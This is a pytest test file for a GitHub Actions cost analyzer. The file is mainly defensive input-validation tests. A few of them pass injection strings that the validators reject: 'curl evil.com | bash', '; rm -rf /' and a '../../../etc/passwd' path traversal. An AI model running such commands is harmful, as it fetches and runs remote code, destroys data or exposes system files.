"""Tests for RunCost — GitHub Actions cost analyzer."""
import pytest
from unittest.mock import MagicMock
from engine import validate_token, validate_repo, detect_os, parse_dt, analyze, recommend


class TestInputValidation:
    """Security-critical: all inputs must be validated."""

    def test_valid_token_classic(self):
        token = "ghp_" + "a" * 36
        assert validate_token(token) == token

    def test_valid_token_fine_grained(self):
        token = "github_pat_" + "x" * 82
        assert validate_token(token) == token

    def test_reject_empty_token(self):
        with pytest.raises(ValueError, match="Invalid GitHub token"):
            validate_token("")

    def test_reject_none_token(self):
        with pytest.raises(ValueError, match="Invalid GitHub token"):
            validate_token(None)

    def test_reject_short_token(self):
        with pytest.raises(ValueError, match="Invalid GitHub token"):
            validate_token("tooshort")

    def test_reject_token_with_spaces(self):
        with pytest.raises(ValueError, match="forbidden characters"):
            validate_token("ghp_valid_but has spaces_here")

    def test_reject_token_injection(self):
        with pytest.raises(ValueError, match="forbidden characters"):
            validate_token("ghp_aaaa; curl evil.com | bash")

    def test_token_strip_whitespace(self):
        token = "ghp_" + "b" * 36
        assert validate_token(f"  {token}  ") == token

    def test_valid_repo(self):
        assert validate_repo("octocat/hello-world") == "octocat/hello-world"

    def test_repo_with_dots(self):
        assert validate_repo("org.name/repo.name") == "org.name/repo.name"

    def test_reject_repo_no_slash(self):
        with pytest.raises(ValueError, match="Invalid repo format"):
            validate_repo("noslash")

    def test_reject_repo_injection(self):
        with pytest.raises(ValueError, match="Invalid repo format"):
            validate_repo("owner/repo; rm -rf /")

    def test_reject_repo_path_traversal(self):
        with pytest.raises(ValueError, match="Invalid repo format"):
            validate_repo("../../../etc/passwd")


class TestDetectOS:
    def test_ubuntu_default(self):
        assert detect_os([]) == "UBUNTU"
        assert detect_os(None) == "UBUNTU"

    def test_ubuntu_explicit(self):
        assert detect_os(["ubuntu-latest"]) == "UBUNTU"

    def test_windows(self):
        assert detect_os(["windows-2022"]) == "WINDOWS"

    def test_macos(self):
        assert detect_os(["macos-13"]) == "MACOS"


class TestParseDt:
    def test_valid_iso(self):
        dt = parse_dt("2024-06-15T10:30:00Z")
        assert dt.hour == 10 and dt.minute == 30

    def test_none_returns_none(self):
        assert parse_dt(None) is None


class TestRecommendations:
    def test_expensive_workflow_flagged(self):
        wfs = {"deploy": {"runs": 4, "cost": 8.0, "minutes": 200, "jobs": {}}}
        recs = recommend(wfs, 4)
        assert any(r["type"] == "expensive_workflow" for r in recs)
        assert recs[0]["avg_cost_usd"] == 2.0

    def test_cheap_workflow_not_flagged(self):
        wfs = {"lint": {"runs": 10, "cost": 0.5, "minutes": 8, "jobs": {}}}
        recs = recommend(wfs, 10)
        assert not any(r["type"] == "expensive_workflow" for r in recs)

    def test_long_job_flagged(self):
        wfs = {"ci": {"runs": 3, "cost": 0.3, "minutes": 5,
                       "jobs": {"build": {"count": 3, "minutes": 60, "cost": 0.48}}}}
        recs = recommend(wfs, 3)
        long_recs = [r for r in recs if r["type"] == "long_job"]
        assert len(long_recs) == 1
        assert long_recs[0]["avg_min"] == 20.0

    def test_high_frequency_flagged(self):
        wfs = {"ci": {"runs": 50, "cost": 1.0, "minutes": 30, "jobs": {}}}
        recs = recommend(wfs, 50)
        assert any(r["type"] == "high_frequency" for r in recs)

    def test_no_recs_for_healthy_ci(self):
        wfs = {"ci": {"runs": 10, "cost": 1.0, "minutes": 20, "jobs": {}}}
        recs = recommend(wfs, 10)
        assert len(recs) == 0


class TestAnalyzeIntegration:
    def test_full_analysis_mock(self):
        client = MagicMock()
        client.runs.return_value = [
            {"id": 101, "name": "Build & Test", "status": "completed"},
            {"id": 102, "name": "Build & Test", "status": "completed"},
        ]
        client.timing.return_value = {
            "billable": {"UBUNTU": {"total_ms": 600000}}  # 10 min
        }
        client.jobs.return_value = [
            {"name": "build", "started_at": "2024-01-01T00:00:00Z",
             "completed_at": "2024-01-01T00:08:00Z", "labels": ["ubuntu-latest"]},
            {"name": "test", "started_at": "2024-01-01T00:08:00Z",
             "completed_at": "2024-01-01T00:10:00Z", "labels": ["ubuntu-latest"]},
        ]
        result = analyze(client, "acme/app", limit=10)
        assert result["total_runs"] == 2
        assert result["total_cost"] > 0
        wf = result["workflows"]["Build & Test"]
        assert wf["runs"] == 2
        assert "build" in wf["jobs"]
        assert "test" in wf["jobs"]

    def test_empty_repo(self):
        client = MagicMock()
        client.runs.return_value = []
        result = analyze(client, "empty/repo", limit=10)
        assert result["total_runs"] == 0
        assert result["total_cost"] == 0
        assert result["workflows"] == {}

    def test_api_error_graceful(self):
        client = MagicMock()
        client.runs.return_value = [{"id": 1, "name": "CI"}]
        client.timing.side_effect = Exception("rate limited")
        client.jobs.side_effect = Exception("rate limited")
        result = analyze(client, "org/repo", limit=5)
        assert result["total_runs"] == 1
        assert result["total_cost"] == 0
